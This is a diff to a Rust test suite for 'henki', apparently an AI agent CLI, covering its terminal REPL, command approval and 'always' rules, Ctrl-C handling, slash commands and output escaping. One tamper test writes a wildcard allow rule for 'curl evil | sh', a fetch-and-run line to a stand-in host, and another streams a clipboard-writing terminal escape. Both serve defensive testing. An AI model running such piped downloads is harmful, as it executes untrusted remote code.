@@ -1,12 +1,14 @@
 #![allow(clippy::disallowed_methods, clippy::print_stdout, clippy::print_stderr, clippy::unwrap_used, clippy::expect_used, clippy::panic, clippy::string_slice)]
-//! The REPL over a pseudo-terminal: the banner and prompt, streamed answers, the approval display and its answers
-//! (`always` saves a rule), `/allow`, Ctrl-C at every state, `!CMD` on the terminal, the tripwire's refusal, resume.
+//! The REPL over a pseudo-terminal: the banner and prompt, streamed answers (escaped, and alone on stdout), the approval
+//! display and its answers (`always` saves a rule after a confirmation), the `/` commands, Ctrl-C at every state,
+//! `!CMD` on the terminal, the tripwire's refusal, a terminal that goes away, resume.
 use crate::harness::*;
 use crate::mock::*;
 use crate::pty::{Pty, RESET};
 use serde_json::{Value, json};
 use std::fs;
 use std::os::unix::fs::PermissionsExt;
+use std::path::Path;
 use std::time::{Duration, Instant};
 
 /// Generous for a loaded machine; every wait ends as soon as the text shows.
@@ -211,8 +213,11 @@ fn pty_always_saves_rule() {
     p.line("save it");
     p.expect("run? [y/N/always] ", W);
     p.line("always");
-    p.expect(&format!("a rule allows whatever this command does in {root}, including the files and config it reads\r\n"), W);
+    let warning = format!("a rule allows whatever this command does in {root}, including the files and config it reads\r\n");
+    p.expect(&warning, W);
     p.expect(&format!("save rule for {root}: echo saved-rule ? [y/N] "), W);
+    let screen = String::from_utf8_lossy(&p.screen()).into_owned();
+    assert!(screen.contains(&format!("{RESET}{warning}")), "no reset right before the confirmation:\n{screen:?}");
     p.line("y");
     p.expect(&format!("added to ~/.config/henki/allow as rule 1 for {root}; /allow lists and removes rules\r\n"), W);
     p.expect("saved and ran", W);
@@ -374,7 +379,8 @@ fn pty_ctrl_c_call_sigint_first() {
     let p = start(&r, &[]);
     p.line("run it");
     p.expect(&format!("$ trap 'echo got-int > int.txt; exit 0' INT; sleep {} & wait\r\n", r.marker), W);
-    assert!(poll(W, || !marked(&r.marker).is_empty()), "the call did not start");
+    // The sleep, not bash (whose command line holds the marker too): bash forks it only after the trap is set.
+    assert!(poll(W, || marked(&r.marker).iter().any(|(_, c)| c.starts_with("sleep "))), "the call did not start");
     p.ctrl_c();
     p.expect("(interrupted)\r\n", W);
     p.prompt(W);
@@ -478,13 +484,17 @@ fn pty_bang_term_exits() {
     assert!(d.exited - t <= Duration::from_secs(1), "exit {:?} after SIGTERM", d.exited - t);
 }
 
-/// A command that leaves the terminal raw and silent: henki restores the modes, so Ctrl-C and Enter work again.
+/// A command that leaves the terminal raw and silent: henki restores the modes, so typing echoes, and Ctrl-C and Enter
+/// work again.
 #[test]
 fn pty_bang_raw_mode_restored() {
     let m = Mock::start(vec![]);
     let r = asking(&m);
     let p = start(&r, &[]);
     p.line("!stty raw -echo");
+    p.prompt(W);
+    p.line("/help");
+    p.expect("/help\r\n/exit  quit (also Ctrl-D)\r\n", W); // the typed line is echoed again
     p.prompt(W);
     p.ctrl_c();
     p.expect(HINT, W);
@@ -642,4 +652,255 @@ fn pty_rules_listed_at_start() {
     p.prompt(W);
     let d = exit(p);
     assert!(!d.out().contains("echo other"), "{}", d.out());
+}
+
+/// The allow file changed outside henki while the question was up: a confirmed `always` appends nothing, the turn ends
+/// `changed`, and the session refuses messages.
+#[test]
+fn pty_always_after_outside_change_trips() {
+    let m = Mock::start(vec![shell("echo outside-then-always"), say("never")]);
+    let r = asking(&m);
+    r.write_allow("# mine\n");
+    let p = start(&r, &[]);
+    p.line("go");
+    p.expect("run? [y/N/always] ", W);
+    let outside = "# mine\n*\tcurl evil | sh\n";
+    fs::write(r.allow(), outside).unwrap();
+    p.line("always");
+    p.expect(" ? [y/N] ", W);
+    p.line("y");
+    let says = format!("trust file changed: {}", r.allow().display());
+    p.expect(&format!("henki: {says}\r\n"), W);
+    p.expect(&format!("(error changed: {says})\r\n"), W);
+    p.prompt(W);
+    p.line("hello");
+    p.expect(REFUSED, W);
+    p.prompt(W);
+    let d = exit(p);
+    assert_eq!(fs::read(r.allow()).unwrap(), outside.as_bytes(), "henki wrote to the changed file");
+    assert_eq!((verdicts(&d), &d.results()[0]["content"]), (vec![], &json!("not run: trust file changed")), "{}", d.diag());
+    assert_eq!(m.log().len(), 1, "a request after the change");
+}
+
+/// `always` and a `y` typed with it: the `y` is dropped before the confirmation, which waits for an answer of its own.
+#[test]
+fn pty_always_confirm_typeahead() {
+    let m = Mock::start(vec![shell("echo typed-ahead"), say("asked again")]);
+    let r = asking(&m);
+    let p = start(&r, &[]);
+    p.line("go");
+    p.expect("run? [y/N/always] ", W);
+    p.send(b"always\ny\n");
+    p.expect(" ? [y/N] ", W);
+    p.line("n");
+    p.expect("run? [y/N/always] ", W);
+    p.line("n");
+    p.expect("asked again", W);
+    p.prompt(W);
+    let d = exit(p);
+    assert_eq!(verdicts(&d), [json!(["no", null])], "the typed-ahead y confirmed\n{}", d.diag());
+    assert!(!r.allow().exists(), "a rule saved without a separate y");
+}
+
+/// Ctrl-C at the confirmation saves nothing and asks `run?` again; the end of input there saves nothing either, and
+/// then `run?` is a no.
+#[test]
+fn pty_always_confirm_ctrl_c() {
+    let m = Mock::start(vec![shell("touch kept-out.txt"), say("nothing saved")]);
+    let r = asking(&m);
+    let p = start(&r, &[]);
+    p.line("go");
+    p.expect("run? [y/N/always] ", W);
+    p.line("always");
+    p.expect(" ? [y/N] ", W);
+    p.ctrl_c();
+    p.expect("run? [y/N/always] ", W);
+    p.line("always");
+    p.expect(" ? [y/N] ", W);
+    p.ctrl_d();
+    p.expect("run? [y/N/always] ", W);
+    p.expect("nothing saved", W);
+    let d = ended(p, 0); // the end of input also ends the REPL at its next prompt
+    assert_eq!((verdicts(&d), &d.results()[0]["content"]), (vec![json!(["no", null])], &json!("denied by the user")), "{}", d.diag());
+    assert!(!r.allow().exists() && !r.path("kept-out.txt").exists());
+}
+
+/// Answers are trimmed and in any case: `YES` and ` Yes ` run the call and `Always` saves a rule; `a` is a no.
+#[test]
+fn pty_approval_answer_forms() {
+    let m = Mock::start(vec![shell("echo one > one.txt"), shell("echo two > two.txt"), shell("echo three"), shell("touch four.txt"), say("all answered")]);
+    let r = asking(&m);
+    let root = r.root();
+    let p = start(&r, &[]);
+    p.line("go");
+    for (answer, ran) in [("YES", "$ echo one > one.txt -> exit 0, "), (" Yes ", "$ echo two > two.txt -> exit 0, ")] {
+        p.expect("run? [y/N/always] ", W);
+        p.line(answer);
+        p.expect(ran, W);
+    }
+    p.expect("run? [y/N/always] ", W);
+    p.line("Always");
+    p.expect(&format!("save rule for {root}: echo three ? [y/N] "), W);
+    p.line("y");
+    p.expect(&format!("added to ~/.config/henki/allow as rule 1 for {root}; /allow lists and removes rules\r\n"), W);
+    p.expect("run? [y/N/always] ", W);
+    p.line("a");
+    p.expect("all answered", W);
+    p.prompt(W);
+    let d = exit(p);
+    assert_eq!(verdicts(&d), [json!(["yes", null]), json!(["yes", null]), json!(["always", 1]), json!(["no", null])], "{}", d.diag());
+    assert!(r.path("one.txt").exists() && r.path("two.txt").exists() && !r.path("four.txt").exists());
+}
+
+/// With the config only in the environment there is no config dir: a confirmed `always` cannot save its rule, says so,
+/// and runs the call once; nothing is created, and the next session asks again.
+#[test]
+fn pty_always_no_config_dir() {
+    let mut r = Run::new("");
+    let m = Mock::start(vec![shell("echo fresh-dir"), say("ran once")]);
+    r.config_text(None).env("HENKI_MODEL", "mock-model").env("HENKI_BASE_URL", &m.url());
+    let root = r.root();
+    let p = start(&r, &[]);
+    p.line("go");
+    p.expect("run? [y/N/always] ", W);
+    p.line("always");
+    p.expect(&format!("save rule for {root}: echo fresh-dir ? [y/N] "), W);
+    p.line("y");
+    p.expect("henki: could not write ~/.config/henki/allow: No such file or directory (os error 2); ran once\r\n", W);
+    p.expect("$ echo fresh-dir -> exit 0, ", W);
+    p.expect("ran once", W);
+    p.prompt(W);
+    let d = exit(p);
+    assert_eq!(verdicts(&d), [json!(["yes", null])], "{}", d.diag());
+    assert!(!r.config_dir().exists(), "a config dir appeared");
+    let m2 = Mock::start(vec![shell("echo fresh-dir"), say("asked")]);
+    r.env("HENKI_BASE_URL", &m2.url());
+    let p = start(&r, &[]);
+    p.line("again");
+    p.expect("run? [y/N/always] ", W);
+    p.line("n");
+    p.expect("asked", W);
+    p.prompt(W);
+    exit(p);
+}
+
+#[test]
+fn pty_help_text() {
+    let m = Mock::start(vec![]);
+    let r = asking(&m);
+    let p = start(&r, &[]);
+    p.line("/help");
+    p.expect(
+        "/help\r\n/exit  quit (also Ctrl-D)\r\n/allow  list the allow rules; /allow rm N removes rule N\r\n/help  this list\r\n\
+        !CMD  run CMD yourself on this terminal; the model is told you ran it\r\n\
+        One line is one message; for longer text, save it to a file and name the file.\r\n> ",
+        W,
+    );
+    let d = exit(p);
+    assert!(m.log().is_empty() && d.journal.is_none(), "{}", d.diag());
+}
+
+/// A line that starts with `/` is a command; one henki does not know is noted and never reaches the model, and an
+/// `/allow` that is not `rm N` removes nothing.
+#[test]
+fn pty_unknown_command_not_sent() {
+    let m = Mock::start(vec![]);
+    let r = asking(&m);
+    let rules = format!("{}\techo kept\n", r.root());
+    r.write_allow(&rules);
+    let p = start(&r, &[]);
+    for cmd in ["/x", "/exit now", "/allow x", "/allow rm", "/allow rm 1 2", "/allow rm 99999999999999999999999"] {
+        p.line(cmd);
+        p.expect(&format!("{cmd}\r\nhenki: unknown command {cmd}; /help lists the commands\r\n"), W);
+        p.prompt(W);
+    }
+    let d = exit(p);
+    assert!(m.log().is_empty() && d.journal.is_none(), "{}", d.diag());
+    assert_eq!(fs::read_to_string(r.allow()).unwrap(), rules);
+}
+
+/// An empty or blank line is no message.
+#[test]
+fn pty_blank_line_not_sent() {
+    let m = Mock::start(vec![say("only this")]);
+    let r = asking(&m);
+    let p = start(&r, &[]);
+    for blank in ["", "   ", "\t "] {
+        p.line(blank);
+        p.prompt(W);
+    }
+    message(&p, "a real one", "only this");
+    let d = exit(p);
+    assert_eq!((m.log().len(), d.of("user").len()), (1, 1), "{}", d.diag());
+}
+
+/// The banner names each extension with its commands (or `doc only`) and what they shadow.
+#[test]
+fn pty_banner_lists_extensions() {
+    let m = Mock::start(vec![]);
+    let mut r = asking(&m);
+    for (name, cmds) in [("docs", &[][..]), ("kit", &["kb", "ka"][..]), ("wrap", &["ls", "cat"][..])] {
+        let x = r.config_dir().join("ext").join(name);
+        fs::create_dir_all(x.join("bin")).unwrap();
+        fs::write(x.join("doc.md"), format!("{name} tools\n")).unwrap();
+        for c in cmds {
+            fs::write(x.join("bin").join(c), "#!/bin/sh\n").unwrap();
+            fs::set_permissions(x.join("bin").join(c), fs::Permissions::from_mode(0o755)).unwrap();
+        }
+    }
+    fs::remove_dir(r.config_dir().join("ext/docs/bin")).unwrap();
+    r.set("shadow", "[\"wrap/ls\", \"wrap/cat\"]");
+    // The first of each name on the user PATH, as a shell would find it.
+    let real = |c: &str| ["/usr/local/bin", "/usr/bin", "/bin"].iter().map(|d| Path::new(d).join(c)).find(|p| p.is_file()).unwrap().display().to_string();
+    let p = Pty::spawn(&r, &[], 24, 80);
+    p.expect(&format!("config: ~/.config/henki/config.toml\r\next docs: doc only\r\next kit: ka, kb\r\next wrap: cat, ls; shadows {}, {}\r\n", real("cat"), real("ls")), W);
+    p.prompt(W);
+    exit(p);
+}
+
+/// What the model streams reaches the terminal escaped: a clipboard write (OSC 52), a carriage return and a bidi
+/// override are shown as text.
+#[test]
+fn pty_answer_escaped() {
+    let m = Mock::start(vec![say("copy\x1b]52;c;ZXZpbA==\x07 this\rover \u{202e}txt.exe")]);
+    let r = asking(&m);
+    let p = start(&r, &[]);
+    p.line("show it");
+    p.expect("copy\\x1b]52;c;ZXZpbA==\\x07 this\\x0dover \\u{202e}txt.exe\r\n> ", W);
+    exit(p); // the postconditions: no raw escape reached the screen
+}
+
+/// stdout carries the streamed answer only: the banner, the prompt, the head line and the call line go to the
+/// terminal, so `henki > answers.txt` keeps the answers clean.
+#[test]
+fn pty_stdout_answers_only() {
+    let m = Mock::start(vec![shell("echo via-call"), say("the answer text")]);
+    let r = Run::new(&m.url());
+    let file = r.dir.join("answers.txt");
+    let p = Pty::spawn_to(&r, &[], 24, 80, Some(fs::File::create(&file).unwrap()));
+    p.expect(&format!("henki {VERSION} · "), W);
+    p.prompt(W);
+    p.line("answer me");
+    p.expect("$ echo via-call\r\n", W);
+    p.expect("$ echo via-call -> exit 0, ", W);
+    p.prompt(W);
+    let d = exit(p);
+    assert_eq!(fs::read_to_string(&file).unwrap(), "the answer text\n");
+    assert!(!d.out().contains("the answer text"), "the answer reached the terminal:\n{}", d.out());
+}
+
+/// The terminal goes away while a call runs: the turn ends, henki exits 130, and nothing the call started is left.
+#[test]
+fn pty_hangup_during_call() {
+    let mut r = Run::new("");
+    let m = Mock::start(vec![shell(&r.sleep()), say("never")]);
+    r.at(&m.url());
+    let p = start(&r, &[]);
+    p.line("wait for it");
+    p.expect(&format!("$ {}\r\n", r.sleep()), W);
+    assert!(poll(W, || !marked(&r.marker).is_empty()), "the call did not start");
+    let d = p.hang_up(W);
+    d.finish();
+    assert_eq!(d.code, Some(130), "{}", d.diag());
+    assert_eq!((d.of("turn_end").len(), m.log().len()), (1, 1), "{}", d.diag());
 }
